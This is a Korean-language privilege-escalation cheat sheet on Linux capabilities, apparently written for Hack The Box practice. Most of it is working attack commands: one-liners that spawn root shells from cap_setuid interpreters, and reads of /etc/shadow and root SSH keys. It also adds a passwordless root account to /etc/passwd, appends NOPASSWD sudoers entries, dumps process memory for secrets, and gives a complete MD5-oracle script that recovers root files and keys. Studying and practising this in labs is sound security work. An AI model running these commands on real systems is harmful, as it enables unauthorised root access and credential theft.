# 07_capabilities

# 리눅스 권한상승 — Capabilities

---

## 개념

Linux capabilities는 root 권한을 세분화한 것. 바이너리에 특정 capability가 설정되어 있으면 root 없이도 특권 작업 가능.

---

## 열거

```bash
getcap -r / 2>/dev/null
```

---

## cap_setuid+ep (가장 위험)

setuid() 호출 가능 → root로 변환

```bash
# python3
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# perl
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash"'

# ruby
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'

# node
node -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0,1,2]})'

# php
php -r 'posix_setuid(0); system("/bin/bash");'
```

---

## cap_dac_read_search+ep (임의 파일 읽기)

```bash
# python3
python3 -c 'print(open("/etc/shadow").read())'

# vim
vim /etc/shadow
```

---

## cap_net_raw+ep (원시 소켓)

```bash
# tcpdump로 트래픽 스니핑
tcpdump -i eth0 -w /tmp/capture.pcap
```

---

## cap_fowner+ep (파일 소유권 무시)

```bash
# chmod로 임의 파일 권한 변경
chmod 777 /etc/shadow
```

---

## cap_sys_admin+ep (다양한 관리 작업)

```bash
# 마운트 등 다양한 권한
mount -o bind /etc/passwd /tmp/passwd
```

---

## GTFOBins — Capabilities 섹션

https://gtfobins.github.io → Capabilities 필터

---

Linux Capabilities는 root 권한을 잘게 쪼개서 특정 바이너리에만 일부 권한을 부여하는 메커니즘이다. 기존 SUID는 root의 모든 권한을 주는 반면, Capabilities는 필요한 권한만 준다는 점에서 더 안전해 보이지만, 잘못 설정되면 오히려 권한 상승의 진입점이 된다. 쉘을 얻은 후 반드시 확인해야 하는 항목이다.

---

### 탐지

```bash
getcap -r / 2>/dev/null
# -r 은 재귀 탐색, 2>/dev/null 은 권한 없어서 나오는 에러 숨김

# 특정 디렉터리만 탐색
getcap -r /usr/bin 2>/dev/null
getcap -r /opt 2>/dev/null

# 프로세스의 현재 capability 확인
cat /proc/$$/status | grep Cap
capsh --decode=<hex값>     # 헥스값을 capability 이름으로 디코딩

# linpeas로 자동 탐지
./linpeas.sh | grep -A 2 "capabilities"
```

---

### Capability 플래그 의미

```
+e    effective   실제로 적용되는 capability
+p    permitted   허용된 capability (effective로 승격 가능)
+i    inheritable 자식 프로세스로 상속 가능

cap_setuid+ep   → effective + permitted 둘 다 설정. 가장 강력. 바로 root 가능
cap_setuid+p    → permitted만. 코드에서 직접 capset() 호출해야 활성화됨
```

---

### 주요 Capability별 위험도 및 공격 방법

```bash
# ━━━ cap_setuid ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# UID를 임의로 변경 가능 → setuid(0) 으로 바로 root
# python, perl, node 등 인터프리터에 설정된 경우 즉시 root

python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
node -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0,1,2]})'

# ruby
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'

# ━━━ cap_dac_read_search ━━━━━━━━━━━━━━━━━━━━━━━━━
# 모든 파일 읽기 권한 우회 → root 소유 파일 전부 읽기 가능
# 직접 root 쉘은 안 되지만 /etc/shadow, /root/.ssh/id_rsa 등 읽기 가능
# Intentions 박스에서 /opt/scanner/scanner 가 이 capability 가진 케이스

# tar로 shadow 파일 읽기
tar cvf /tmp/shadow.tar /etc/shadow 2>/dev/null
tar -xvf /tmp/shadow.tar -C /tmp/
cat /tmp/etc/shadow

# tar로 root SSH 키 읽기
tar cvf /tmp/root_key.tar /root/.ssh/id_rsa 2>/dev/null
tar -xvf /tmp/root_key.tar -C /tmp/
cat /tmp/root/.ssh/id_rsa

# python으로 파일 직접 읽기
python3 -c "print(open('/etc/shadow').read())"
python3 -c "print(open('/root/.ssh/id_rsa').read())"
python3 -c "print(open('/root/root.txt').read())"

# gdb로 파일 읽기
gdb -batch -ex 'python print(open("/etc/shadow").read())'

# Prefix MD5 Oracle 방식 (Intentions 박스처럼 파일 내용을 직접 못 읽을 때)
# scanner 같은 도구가 MD5만 출력할 경우 한 바이트씩 역추적
/opt/scanner/scanner -c /root/root.txt -s x -p -l 1
# 1바이트씩 늘려가며 MD5 비교로 내용 복원

# ━━━ cap_dac_override ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 모든 파일 쓰기 권한 우회 → /etc/passwd, /etc/sudoers 직접 수정 가능

# /etc/passwd에 root 권한 유저 추가
python3 -c "
data = open('/etc/passwd').read()
data += 'hacked::0:0::/root:/bin/bash\n'
open('/etc/passwd', 'w').write(data)
"
su hacked      # 비밀번호 없이 root로 전환

# /etc/sudoers에 현재 유저 추가
python3 -c "
data = open('/etc/sudoers').read()
data += '\n<현재유저> ALL=(ALL) NOPASSWD: ALL\n'
open('/etc/sudoers', 'w').write(data)
"
sudo /bin/bash

# vim으로 /etc/sudoers 수정
vim /etc/sudoers

# ━━━ cap_setuid + cap_dac_override 동시 설정 ━━━━
# 파일 쓰기 + UID 변경 → 즉시 root
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# ━━━ cap_net_raw ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RAW 소켓 사용 가능 → 네트워크 스니핑
# 직접 권한 상승은 안 되지만 내부 트래픽에서 크리덴셜 캡처 가능

tcpdump -i eth0 -w /tmp/capture.pcap
tcpdump -i lo port 80 -A     # 루프백 HTTP 트래픽 평문 캡처
# 캡처 후 Wireshark나 strings로 크리덴셜 추출

# ━━━ cap_sys_admin ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 거의 root에 준하는 권한. 마운트, 언마운트, 네임스페이스 조작 등
# 컨테이너 탈출에도 사용됨

# ━━━ cap_sys_ptrace ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 다른 프로세스 메모리 접근 가능 → root 프로세스 메모리에서 크리덴셜 추출

# root 프로세스 찾기
ps aux | grep root
# gdb로 해당 프로세스 메모리 덤프
gdb -p <PID> -batch -ex "dump memory /tmp/proc.dump 0x0 0xffffffff"
strings /tmp/proc.dump | grep -i "pass\|secret\|key"
```

---

### cap_dac_read_search — Prefix MD5 Oracle 공격 (Intentions 박스 방식)

scanner 같은 도구가 cap_dac_read_search를 가지고 있지만 파일 내용을 직접 출력하지 않고 앞 N바이트의 MD5만 출력할 때 사용하는 방식이다. N을 1씩 늘리면서 MD5를 비교해 한 바이트씩 역추적하면 전체 파일 내용을 복원할 수 있다.

```bash
# 도구 동작 확인
/opt/scanner/scanner -c /root/root.txt -s x -p -l 1
# [DEBUG] /root/root.txt has hash e4da3b7fbbce2345d7772b0674a318d5

# 범용 Prefix MD5 Oracle 스크립트
cat > /tmp/oracle.py <<'EOF'
#!/usr/bin/env python3
import hashlib, subprocess, sys, string

SCANNER = "/opt/scanner/scanner"   # capability 가진 바이너리
TARGET  = "/root/root.txt"         # 읽을 파일
# 파일 종류에 따라 charset 변경
# HTB flag (hex): b"0123456789abcdef\n"
# SSH key (전체): bytes(range(256))
# 일반 텍스트: bytes(string.printable, "ascii")
CHARSET = b"0123456789abcdef\n"
STOP    = ""          # 이 문자열 나오면 중단 (SSH key: "-----END OPENSSH PRIVATE KEY-----")
MAX     = 4096

def get_hash(n):
    p = subprocess.run(
        [SCANNER, "-c", TARGET, "-s", "x", "-p", "-l", str(n)],
        stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True
    )
    for w in p.stdout.split():
        if len(w) == 32 and all(c in "0123456789abcdefABCDEF" for c in w):
            return w.lower()
    return None

out = b""
for n in range(1, MAX + 1):
    h = get_hash(n)
    if not h:
        break
    found = None
    for c in CHARSET:
        if hashlib.md5(out + bytes([c])).hexdigest() == h:
            found = bytes([c])
            break
    if not found:
        break
    out += found
    sys.stdout.buffer.write(found)
    sys.stdout.buffer.flush()
    if STOP and STOP.encode() in out:
        break
EOF

chmod +x /tmp/oracle.py

# root.txt 복원 (hex charset)
python3 /tmp/oracle.py

# root SSH 키 복원 (모든 바이트)
# CHARSET = bytes(range(256)), STOP = "-----END OPENSSH PRIVATE KEY-----" 로 변경 후
python3 /tmp/oracle.py > /tmp/root_id_rsa
chmod 600 /tmp/root_id_rsa
ssh -i /tmp/root_id_rsa root@127.0.0.1
```

---

### GTFOBins에서 Capability 확인

GTFOBins(https://gtfobins.github.io)에서 바이너리 검색 후 Capabilities 탭을 확인해야 한다. cap_setuid가 설정된 바이너리면 대부분 직접 root 쉘 획득이 가능하다. cap_dac_read_search면 파일 읽기 방법을 확인해야 한다.

```bash
# GTFOBins 빠른 확인용 (로컬에서)
# capability 있는 바이너리 이름 파악 후 사이트에서 검색
getcap -r / 2>/dev/null | awk -F'=' '{print $1}' | xargs -I{} basename {}

# 자주 나오는 케이스
# python3 cap_setuid+ep   → os.setuid(0) 후 /bin/bash
# perl cap_setuid+ep      → POSIX::setuid(0) 후 exec
# vim cap_dac_read_search → :r /etc/shadow 로 읽기
# tar cap_dac_read_search → cvf로 압축 후 내용 확인
# node cap_setuid+ep      → process.setuid(0) 후 spawn
# gdb cap_dac_read_search → python print(open('/etc/shadow').read())
```